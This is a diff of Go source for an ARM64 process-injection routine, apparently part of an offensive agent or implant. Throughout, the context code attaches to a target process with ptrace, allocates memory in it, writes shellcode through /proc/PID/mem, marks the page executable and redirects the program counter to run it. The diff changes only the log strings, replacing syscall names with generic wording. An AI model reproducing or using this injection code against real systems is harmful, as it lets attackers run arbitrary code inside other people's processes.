@@ -99,12 +99,12 @@ func procMemInjectArm64(pid int, shellcode []byte) structs.CommandResult {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
-	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", pid))
+	sb.WriteString(fmt.Sprintf("[*] Attaching to PID %d...\n", pid))
 	if err := syscall.PtraceAttach(pid); err != nil {
 		if err == syscall.EPERM && scope >= 1 {
-			return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n[!] %s\n", err, hint))
+			return errorResult(sb.String() + fmt.Sprintf("[!] Attach failed: %v\n[!] %s\n", err, hint))
 		}
-		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v\n", err))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Attach failed: %v\n", err))
 	}
 
 	var ws syscall.WaitStatus
@@ -117,7 +117,7 @@ func procMemInjectArm64(pid int, shellcode []byte) structs.CommandResult {
 	var origRegs syscall.PtraceRegs
 	if err := syscall.PtraceGetRegs(pid, &origRegs); err != nil {
 		_ = syscall.PtraceDetach(pid)
-		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_GETREGS failed: %v\n", err))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Register read failed: %v\n", err))
 	}
 	sb.WriteString(fmt.Sprintf("[+] Saved registers (PC=0x%X, SP=0x%X)\n", origRegs.Pc, origRegs.Sp))
 
@@ -140,14 +140,14 @@ func procMemInjectArm64(pid int, shellcode []byte) structs.CommandResult {
 	if err != nil {
 		_ = syscall.PtraceSetRegs(pid, &origRegs)
 		_ = syscall.PtraceDetach(pid)
-		return errorResult(sb.String() + fmt.Sprintf("[!] mmap syscall failed: %v\n", err))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Memory allocation failed: %v\n", err))
 	}
 	if allocAddr >= 0xfffffffffffff000 {
 		_ = syscall.PtraceSetRegs(pid, &origRegs)
 		_ = syscall.PtraceDetach(pid)
-		return errorResult(sb.String() + fmt.Sprintf("[!] mmap returned MAP_FAILED (0x%X)\n", allocAddr))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Memory allocation returned error (0x%X)\n", allocAddr))
 	}
-	sb.WriteString(fmt.Sprintf("[+] mmap allocated RW page at 0x%X (%d bytes)\n", allocAddr, pageSize))
+	sb.WriteString(fmt.Sprintf("[+] Allocated writable memory at 0x%X (%d bytes)\n", allocAddr, pageSize))
 
 	// Write shellcode via /proc/PID/mem
 	memPath := fmt.Sprintf("/proc/%d/mem", pid)
@@ -165,12 +165,12 @@ func procMemInjectArm64(pid int, shellcode []byte) structs.CommandResult {
 	if err != nil {
 		_ = syscall.PtraceSetRegs(pid, &origRegs)
 		_ = syscall.PtraceDetach(pid)
-		return errorResult(sb.String() + fmt.Sprintf("[!] mprotect syscall failed: %v\n", err))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Protection change failed: %v\n", err))
 	}
 	if mprotectRet != 0 {
-		sb.WriteString(fmt.Sprintf("[!] mprotect returned %d (non-zero), continuing anyway\n", int64(mprotectRet)))
+		sb.WriteString(fmt.Sprintf("[!] Protection change returned %d (non-zero), continuing anyway\n", int64(mprotectRet)))
 	} else {
-		sb.WriteString("[+] mprotect: page now PROT_READ|PROT_EXEC\n")
+		sb.WriteString("[+] Memory protection set to read+execute\n")
 	}
 
 	// Redirect execution to shellcode
@@ -179,7 +179,7 @@ func procMemInjectArm64(pid int, shellcode []byte) structs.CommandResult {
 	if err := syscall.PtraceSetRegs(pid, &newRegs); err != nil {
 		_ = syscall.PtraceSetRegs(pid, &origRegs)
 		_ = syscall.PtraceDetach(pid)
-		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_SETREGS failed: %v\n", err))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Register write failed: %v\n", err))
 	}
 	sb.WriteString(fmt.Sprintf("[+] Set PC to 0x%X\n", allocAddr))
 
@@ -187,11 +187,11 @@ func procMemInjectArm64(pid int, shellcode []byte) structs.CommandResult {
 	if err := syscall.PtraceCont(pid, 0); err != nil {
 		_ = syscall.PtraceSetRegs(pid, &origRegs)
 		_ = syscall.PtraceDetach(pid)
-		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_CONT failed: %v\n", err))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Continue failed: %v\n", err))
 	}
 
 	if err := syscall.PtraceDetach(pid); err != nil {
-		sb.WriteString(fmt.Sprintf("[!] PTRACE_DETACH failed: %v\n", err))
+		sb.WriteString(fmt.Sprintf("[!] Detach failed: %v\n", err))
 	} else {
 		sb.WriteString("[+] Detached from process\n")
 	}
